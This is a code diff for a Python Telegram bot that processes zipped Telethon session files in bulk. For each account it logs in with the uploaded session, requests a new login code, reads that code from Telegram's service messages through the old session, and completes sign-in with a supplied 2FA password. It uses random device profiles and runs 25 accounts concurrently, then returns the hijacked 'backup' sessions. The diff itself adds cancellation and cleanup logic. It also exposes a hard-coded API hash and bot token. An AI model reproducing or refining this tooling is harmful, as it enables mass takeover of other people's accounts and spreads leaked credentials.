@@ -7,7 +7,7 @@ import random
 from threading import Thread
 from flask import Flask, jsonify
 from hydrogram import Client as BotClient, filters
-from hydrogram.types import Message
+from hydrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
 from telethon import TelegramClient
 from telethon.errors import (
     SessionPasswordNeededError,
@@ -28,7 +28,6 @@ API_ID = 36966114
 API_HASH = "5b4e9d0389efb9117afa0ee26bb790d5"
 BOT_TOKEN = "8983719162:AAH3tyQ29g19y7TK63-9L29bGZNQwwLyaaY"
 
-# একই সাথে কয়টি ফাইল প্রসেস হবে (Speed Limit Control)
 MAX_CONCURRENT_TASKS = 25  
 
 user_states = {}
@@ -84,7 +83,9 @@ async def handle_zip(client: BotClient, message: Message):
     user_states[chat_id] = {
         "step": "WAITING_2FA",
         "zip_path": zip_path,
-        "user_dir": user_dir
+        "user_dir": user_dir,
+        "is_cancelled": False,
+        "active_tasks": []
     }
 
     await msg.edit_text(
@@ -94,10 +95,16 @@ async def handle_zip(client: BotClient, message: Message):
     )
 
 # -------------------------------------------------------------
-# Fast Session Worker Function
+# Strict Isolated Worker Function
 # -------------------------------------------------------------
-async def process_single_session_fast(semaphore, session_path, success_dir, failed_dir, wrong_2fa_dir, two_fa_pass):
+async def process_single_session_fast(chat_id, semaphore, session_path, success_dir, failed_dir, wrong_2fa_dir, two_fa_pass):
+    if user_states.get(chat_id, {}).get("is_cancelled", False):
+        return "cancelled"
+
     async with semaphore:
+        if user_states.get(chat_id, {}).get("is_cancelled", False):
+            return "cancelled"
+
         file_name = os.path.basename(session_path)
         dev = random.choice(DEVICE_PROFILES)
 
@@ -112,6 +119,10 @@ async def process_single_session_fast(semaphore, session_path, success_dir, fail
 
         try:
             await asyncio.wait_for(p_client.connect(), timeout=10)
+            if user_states.get(chat_id, {}).get("is_cancelled", False):
+                await p_client.disconnect()
+                return "cancelled"
+
             if not await p_client.is_user_authorized():
                 shutil.copy(session_path, os.path.join(failed_dir, file_name))
                 return "failed"
@@ -119,9 +130,12 @@ async def process_single_session_fast(semaphore, session_path, success_dir, fail
             me = await p_client.get_me()
             phone = me.phone
 
-            new_session_path = os.path.join(success_dir, f"backup_{file_name}")
+            # Temp path, backup session won't move to success_dir until sign-in succeeds
+            temp_session_name = f"backup_{file_name}"
+            temp_session_path = os.path.join(user_states[chat_id]["user_dir"], temp_session_name)
+            
             s_client = TelegramClient(
-                new_session_path.replace(".session", ""),
+                temp_session_path.replace(".session", ""),
                 API_ID,
                 API_HASH,
                 device_model=dev["model"],
@@ -132,9 +146,16 @@ async def process_single_session_fast(semaphore, session_path, success_dir, fail
             await asyncio.wait_for(s_client.connect(), timeout=10)
             await s_client.send_code_request(phone)
 
-            # Fast OTP Capture (Max 10-12 seconds limit)
+            # Fast OTP Capture
             otp_code = None
             for _ in range(4):
+                if user_states.get(chat_id, {}).get("is_cancelled", False):
+                    await p_client.disconnect()
+                    await s_client.disconnect()
+                    if os.path.exists(temp_session_path):
+                        os.remove(temp_session_path)
+                    return "cancelled"
+
                 await asyncio.sleep(2.5)
                 async for nav_msg in p_client.iter_messages(777000, limit=5):
                     if nav_msg.text:
@@ -148,8 +169,8 @@ async def process_single_session_fast(semaphore, session_path, success_dir, fail
             if not otp_code:
                 await p_client.disconnect()
                 await s_client.disconnect()
-                if os.path.exists(new_session_path):
-                    os.remove(new_session_path)
+                if os.path.exists(temp_session_path):
+                    os.remove(temp_session_path)
                 shutil.copy(session_path, os.path.join(failed_dir, file_name))
                 return "failed"
 
@@ -162,20 +183,26 @@ async def process_single_session_fast(semaphore, session_path, success_dir, fail
                     except PasswordHashInvalidError:
                         await p_client.disconnect()
                         await s_client.disconnect()
-                        if os.path.exists(new_session_path):
-                            os.remove(new_session_path)
+                        if os.path.exists(temp_session_path):
+                            os.remove(temp_session_path)
                         shutil.copy(session_path, os.path.join(wrong_2fa_dir, file_name))
                         return "wrong_2fa"
                 else:
                     await p_client.disconnect()
                     await s_client.disconnect()
-                    if os.path.exists(new_session_path):
-                        os.remove(new_session_path)
+                    if os.path.exists(temp_session_path):
+                        os.remove(temp_session_path)
                     shutil.copy(session_path, os.path.join(wrong_2fa_dir, file_name))
                     return "wrong_2fa"
 
             await p_client.disconnect()
             await s_client.disconnect()
+
+            # ONLY move to success_dir after full successful authentication
+            final_success_path = os.path.join(success_dir, temp_session_name)
+            if os.path.exists(temp_session_path):
+                shutil.move(temp_session_path, final_success_path)
+
             return "success"
 
         except Exception:
@@ -195,7 +222,29 @@ def create_zip_from_dir(source_dir, output_zip_path):
     return True
 
 # -------------------------------------------------------------
-# Main Batch Processing
+# Cancel Button Callback Handler
+# -------------------------------------------------------------
+@bot.on_callback_query(filters.regex("cancel_process"))
+async def handle_cancel(client: BotClient, callback: CallbackQuery):
+    chat_id = callback.message.chat.id
+    if chat_id in user_states:
+        user_states[chat_id]["is_cancelled"] = True
+        
+        tasks = user_states[chat_id].get("active_tasks", [])
+        for task in tasks:
+            if not task.done():
+                task.cancel()
+
+        await callback.answer("🚫 Process Cancelled!", show_alert=True)
+        await callback.message.edit_text("❌ **All Operations Cancelled!**")
+        
+        user_dir = user_states[chat_id].get("user_dir")
+        if user_dir and os.path.exists(user_dir):
+            shutil.rmtree(user_dir, ignore_errors=True)
+        user_states.pop(chat_id, None)
+
+# -------------------------------------------------------------
+# Main Batch Processing Logic
 # -------------------------------------------------------------
 @bot.on_message(filters.private & filters.text & ~filters.command("start"))
 async def start_bulk_process(client: BotClient, message: Message):
@@ -208,7 +257,11 @@ async def start_bulk_process(client: BotClient, message: Message):
     user_input = message.text.strip()
     two_fa_pass = None if user_input.lower() == "no" else user_input
 
-    msg = await message.reply_text("⚡ Processing fast archive extraction...")
+    cancel_keyboard = InlineKeyboardMarkup([
+        [InlineKeyboardButton("🛑 Cancel Processing", callback_data="cancel_process")]
+    ])
+
+    msg = await message.reply_text("⚡ Processing fast archive extraction...", reply_markup=cancel_keyboard)
 
     user_dir = data["user_dir"]
     zip_path = data["zip_path"]
@@ -245,16 +298,25 @@ async def start_bulk_process(client: BotClient, message: Message):
         user_states.pop(chat_id, None)
         return
 
-    await msg.edit_text(f"🚀 Running Turbo Engine for {total_files} accounts...")
+    await msg.edit_text(f"🚀 Running Turbo Engine for {total_files} accounts...", reply_markup=cancel_keyboard)
 
-    # Semaphore concurrency control for 1-sec/acc speed
     semaphore = asyncio.Semaphore(MAX_CONCURRENT_TASKS)
     tasks = [
-        process_single_session_fast(semaphore, s, success_dir, failed_dir, wrong_2fa_dir, two_fa_pass) 
+        asyncio.create_task(
+            process_single_session_fast(chat_id, semaphore, s, success_dir, failed_dir, wrong_2fa_dir, two_fa_pass)
+        )
         for s in session_files
     ]
     
-    results = await asyncio.gather(*tasks)
+    user_states[chat_id]["active_tasks"] = tasks
+
+    try:
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+    except asyncio.CancelledError:
+        return
+
+    if user_states.get(chat_id, {}).get("is_cancelled", False):
+        return
 
     success_count = results.count("success")
     failed_count = results.count("failed")
@@ -268,31 +330,35 @@ async def start_bulk_process(client: BotClient, message: Message):
         f"• **2FA Mismatch:** `{wrong_2fa_count}`\n"
     )
 
-    await msg.edit_text(f"{report}\n📦 Sending files...")
+    await msg.edit_text(f"{report}\n📦 Sending categorized files...")
 
-    success_zip = os.path.join(user_dir, "Success_Sessions.zip")
-    if create_zip_from_dir(success_dir, success_zip):
-        await message.reply_document(
-            document=success_zip,
-            file_name="Success_Sessions.zip",
-            caption=f"✅ **Success Sessions ({success_count})**"
-        )
+    # ONLY send ZIP if the count is greater than 0 and ZIP was created
+    if success_count > 0:
+        success_zip = os.path.join(user_dir, "Success_Sessions.zip")
+        if create_zip_from_dir(success_dir, success_zip):
+            await message.reply_document(
+                document=success_zip,
+                file_name="Success_Sessions.zip",
+                caption=f"✅ **Success Sessions ({success_count})**"
+            )
 
-    failed_zip = os.path.join(user_dir, "Failed_Invalid_Sessions.zip")
-    if create_zip_from_dir(failed_dir, failed_zip):
-        await message.reply_document(
-            document=failed_zip,
-            file_name="Failed_Invalid_Sessions.zip",
-            caption=f"❌ **Failed / Invalid Sessions ({failed_count})**"
-        )
+    if failed_count > 0:
+        failed_zip = os.path.join(user_dir, "Failed_Invalid_Sessions.zip")
+        if create_zip_from_dir(failed_dir, failed_zip):
+            await message.reply_document(
+                document=failed_zip,
+                file_name="Failed_Invalid_Sessions.zip",
+                caption=f"❌ **Failed / Invalid Sessions ({failed_count})**"
+            )
 
-    wrong_2fa_zip = os.path.join(user_dir, "Wrong_2FA_Sessions.zip")
-    if create_zip_from_dir(wrong_2fa_dir, wrong_2fa_zip):
-        await message.reply_document(
-            document=wrong_2fa_zip,
-            file_name="Wrong_2FA_Sessions.zip",
-            caption=f"🔐 **Wrong 2FA Password Sessions ({wrong_2fa_count})**"
-        )
+    if wrong_2fa_count > 0:
+        wrong_2fa_zip = os.path.join(user_dir, "Wrong_2FA_Sessions.zip")
+        if create_zip_from_dir(wrong_2fa_dir, wrong_2fa_zip):
+            await message.reply_document(
+                document=wrong_2fa_zip,
+                file_name="Wrong_2FA_Sessions.zip",
+                caption=f"🔐 **Wrong 2FA Password Sessions ({wrong_2fa_count})**"
+            )
 
     shutil.rmtree(user_dir, ignore_errors=True)
     user_states.pop(chat_id, None)
@@ -302,5 +368,5 @@ if __name__ == "__main__":
     server_thread.daemon = True
     server_thread.start()
 
-    print("🤖 Turbo Engine Active...")
+    print("🤖 Turbo Engine Active with Strict Isolated Output...")
     bot.run()
